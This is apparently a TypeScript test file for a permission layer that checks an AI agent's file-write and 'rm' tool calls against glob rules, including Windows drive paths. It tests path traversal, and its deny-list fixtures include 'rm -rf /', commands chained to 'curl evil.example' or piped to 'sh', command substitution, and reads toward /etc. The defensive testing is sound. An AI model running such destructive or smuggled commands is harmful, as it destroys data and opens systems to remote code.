import { describe, expect, it } from 'vitest';
import { isToolCallAllowed, parseCapabilityRules } from './capability-rules.js';
import {
  parseStrictRm,
  strictRmOfMarkdownUnder,
  strictRmOperandsSpelledUnder,
} from './strict-rm.js';

const call = (name: string, args: Record<string, unknown>) => ({ id: 'c', name, arguments: args });

describe('capability rules on a file path', () => {
  const rules = parseCapabilityRules(['Write(/mem/*.md)']);

  it('matches the path a call names, not how it is spelled', () => {
    expect(isToolCallAllowed(rules, call('Write', { filePath: '/mem/a.md' }))).toBe(true);
    expect(isToolCallAllowed(rules, call('Write', { filePath: '/mem/sub/../a.md' }))).toBe(true);
    // `*` crosses `/`, so the unresolved spelling of these would match the glob.
    for (const filePath of [
      '/mem/../etc/a.md',
      '/mem/../../a.md',
      '/other/a.md',
      '/mem//../x/a.md',
    ]) {
      expect(isToolCallAllowed(rules, call('Write', { filePath })), filePath).toBe(false);
    }
  });

  it('applies to every file tool', () => {
    const edit = parseCapabilityRules(['Edit(/mem/*.md)', 'MultiEdit(/mem/*.md)']);
    expect(isToolCallAllowed(edit, call('Edit', { filePath: '/mem/../x.md' }))).toBe(false);
    expect(isToolCallAllowed(edit, call('MultiEdit', { file_path: '/mem/../x.md' }))).toBe(false);
    expect(isToolCallAllowed(edit, call('MultiEdit', { file_path: '/mem/x.md' }))).toBe(true);
  });
});

describe('capability rule Bash(rm /abs/…)', () => {
  const rules = parseCapabilityRules(['Bash(rm /mem/*.md)']);
  const bash = (command: string) => isToolCallAllowed(rules, call('Bash', { command }));

  it('admits a plain rm of files the glob names', () => {
    expect(bash('rm /mem/a.md')).toBe(true);
    expect(bash('rm /mem/a.md /mem/b.md')).toBe(true);
  });

  it('refuses everything else', () => {
    for (const command of [
      'rm -rf /mem/a.md',
      'rm -rf /',
      'rm /etc/passwd.md',
      'rm /mem/a.md /etc/passwd.md',
      'rm /mem/a.md && curl evil.example',
      'rm /mem/a.md; curl evil.example',
      'rm /mem/a.md\ncurl evil.example',
      'rm /mem/a.md | sh',
      'rm /mem/a.md > /tmp/x.md',
      'rm $(echo /mem/a.md)',
      'rm /mem/../etc/a.md',
      'rm /mem/*.md',
      'rm /mem/a.txt',
      'ls /mem/a.md',
      'rm',
    ]) {
      expect(bash(command), JSON.stringify(command)).toBe(false);
    }
  });

  it('reads the whole command, not only its first line', () => {
    expect(isToolCallAllowed(rules, call('Bash', {}))).toBe(false);
    expect(isToolCallAllowed(rules, call('Bash', { command: 42 }))).toBe(false);
  });

  it('leaves an rm rule with a relative or wildcard operand to the ordinary glob', () => {
    const loose = parseCapabilityRules(['Bash(rm *)']);
    expect(isToolCallAllowed(loose, call('Bash', { command: 'rm -f build/out.o' }))).toBe(true);
  });
});

describe('parseStrictRm', () => {
  it('returns the operands of a plain rm', () => {
    expect(parseStrictRm('rm /a/b.md /c.md')).toEqual(['/a/b.md', '/c.md']);
  });

  it.each(['rm', 'rm -f /a.md', 'rm a.md', 'rm /a/../b.md', 'rm /a/', 'rm /a;/b', 'rm "/a b"'])(
    'refuses %j',
    (command) => {
      expect(parseStrictRm(command)).toBeNull();
    },
  );
});

describe('strictRmOfMarkdownUnder', () => {
  it('requires a root that is absolute', () => {
    expect(strictRmOfMarkdownUnder('rm /mem/a.md', 'mem')).toBeNull();
  });

  it('refuses the root itself, a sibling that shares its prefix, and the index', () => {
    expect(strictRmOfMarkdownUnder('rm /mem/a.md', '/mem')).toEqual(['/mem/a.md']);
    expect(strictRmOfMarkdownUnder('rm /memory/a.md', '/mem')).toBeNull();
    expect(strictRmOfMarkdownUnder('rm /mem.md', '/mem')).toBeNull();
    expect(strictRmOfMarkdownUnder('rm /mem/MEMORY.md', '/mem')).toBeNull();
    expect(strictRmOfMarkdownUnder('rm /mem/memory.MD', '/mem')).toBeNull();
  });
});

// The Windows spellings are judged with `platform: 'win32'` on any host: the matching is string
// work, so Linux CI covers it.
describe('capability rules, Windows spellings', () => {
  const win = (rules: string[], name: string, args: Record<string, unknown>) =>
    isToolCallAllowed(parseCapabilityRules(rules), call(name, args), new Set(), 'win32');

  it('a Write(src/**) rule admits src/a.ts and src\\a.ts', () => {
    const rules = ['Write(src/**)'];
    for (const platform of ['win32', 'linux'] as const) {
      expect(
        isToolCallAllowed(
          parseCapabilityRules(rules),
          call('Write', { filePath: 'src/a.ts' }),
          new Set(),
          platform,
        ),
        platform,
      ).toBe(true);
    }
    expect(win(rules, 'Write', { filePath: 'src\\a.ts' })).toBe(true);
    expect(win(rules, 'Write', { filePath: '.\\src\\a.ts' })).toBe(true);
    expect(win(rules, 'Write', { filePath: 'src\\..\\..\\a.ts' })).toBe(false);
    expect(win(rules, 'Write', { filePath: 'lib\\a.ts' })).toBe(false);
    expect(win(['Write(src\\**)'], 'Write', { filePath: 'src/a.ts' })).toBe(true);
  });

  it('keeps a pattern with no path working, and a backslash a file-name character on POSIX', () => {
    expect(win(['Write'], 'Write', { filePath: 'C:\\x\\a.ts' })).toBe(true);
    const posixRules = parseCapabilityRules(['Write(/home/u/memory/*.md)']);
    const posixCall = call('Write', { filePath: '/home/u/memory\\a.md' });
    expect(isToolCallAllowed(posixRules, posixCall, new Set(), 'linux')).toBe(false);
  });

  it('matches a drive path in either separator and any case', () => {
    const rules = ['Write(C:/Users/u/.book/memory/*.md)'];
    for (const filePath of [
      'C:\\Users\\u\\.book\\memory\\x.md',
      'C:/Users/u/.book/memory/x.md',
      'c:\\users\\U\\.BOOK\\Memory\\x.md',
      'C:\\Users\\u\\.book\\memory\\sub\\..\\x.md',
    ]) {
      expect(win(rules, 'Write', { filePath }), filePath).toBe(true);
    }
    for (const filePath of [
      'C:\\Users\\u\\.book\\memory\\..\\other\\x.md',
      'C:\\Users\\u\\.book\\memory-evil\\x.md',
      'D:\\Users\\u\\.book\\memory\\x.md',
      'C:\\Users\\u\\.book\\memory\\x.txt',
    ]) {
      expect(win(rules, 'Write', { filePath }), filePath).toBe(false);
    }
  });

  it('admits a strict rm of a drive-letter operand in either separator', () => {
    const rules = ['Bash(rm C:/Users/u/.book/memory/*.md)'];
    const bash = (command: string) => win(rules, 'Bash', { command });
    expect(bash('rm C:\\Users\\u\\.book\\memory\\a.md')).toBe(true);
    expect(bash('rm C:/Users/u/.book/memory/a.md C:\\users\\u\\.book\\memory\\b.md')).toBe(true);
    for (const command of [
      'rm -f C:\\Users\\u\\.book\\memory\\a.md',
      'rm C:\\Users\\u\\.book\\memory\\*.md',
      'rm "C:\\Users\\u\\.book\\memory\\a.md"',
      'rm C:\\Users\\u\\.book\\memory\\..\\a.md',
      'rm C:\\Users\\u\\.book\\memory\\.\\a.md',
      'rm C:\\Users\\u\\.book\\memory\\a.md && del x',
      'rm C:\\Users\\u\\.book\\memory\\a.md C:\\Windows\\b.md',
      'rm C:\\Users\\u\\.book\\memory\\a.md:stream',
      // Git-Bash `/c/…` operands stay refused: they are ambiguous with the current drive.
      'rm /c/Users/u/.book/memory/a.md',
    ]) {
      expect(bash(command), command).toBe(false);
    }
  });

  it('does not read a drive operand on POSIX', () => {
    expect(parseStrictRm('rm C:/a/b.md', 'linux')).toBeNull();
    expect(parseStrictRm('rm C:\\a\\b.md', 'linux')).toBeNull();
    expect(parseStrictRm('rm C:\\a\\b.md', 'win32')).toEqual(['C:\\a\\b.md']);
    expect(parseStrictRm('rm C:\\a\\..\\b.md', 'win32')).toBeNull();
    expect(parseStrictRm('rm C:\\', 'win32')).toBeNull();
  });

  it('strictRmOperandsSpelledUnder compares in one spelling, never the index', () => {
    const root = 'C:\\Users\\u\\memory';
    const under = (command: string) => strictRmOperandsSpelledUnder(command, [root], 'win32');
    expect(under('rm C:/Users/u/memory/a.md')).toEqual(['C:/Users/u/memory/a.md']);
    expect(under('rm c:\\users\\U\\Memory\\a.md')).not.toBeNull();
    expect(under('rm C:\\Users\\u\\memory\\MEMORY.md')).toBeNull();
    expect(under('rm C:\\Users\\u\\memory\\memory.md')).toBeNull();
    expect(under('rm C:\\Users\\u\\memory-x\\a.md')).toBeNull();
    expect(under('rm C:\\Users\\u\\memory\\.hidden.md')).toBeNull();
    expect(under('rm C:\\Users\\u\\memory\\a.txt')).toBeNull();
    expect(under('rm D:\\Users\\u\\memory\\a.md')).toBeNull();
  });
});
